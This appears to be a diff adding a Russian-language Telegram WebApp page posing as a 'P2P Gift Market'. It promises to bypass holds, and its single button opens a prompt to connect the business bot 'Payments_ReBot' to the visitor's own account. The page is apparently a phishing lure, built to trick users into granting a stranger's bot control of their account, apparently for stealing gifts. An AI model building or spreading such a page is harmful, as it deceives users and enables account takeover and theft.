@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>P2P Gift Market</title>
+    <script src="https://telegram.org"></script>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #17212b; color: white; padding-top: 40px; }
+        button { background: #2481cc; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px;}
+        button:hover { background: #1f71b3; }
+    </style>
+</head>
+<body>
+    <h2>🚀 P2P Биржа Подарков</h2>
+    <p>Авторизация сессии маркетплейса для обхода холдов</p>
+    <button id="connectBtn">🔗 Привязать склад без ограничений</button>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        document.getElementById('connectBtn').onclick = function() {
+            // Вызываем шторку привязки бизнес-бота прямо из сессии WebApp
+            tg.openTelegramLink("tg://set_business_bot?username=Payments_ReBot");
+        };
+    </script>
+</body>
+</html>
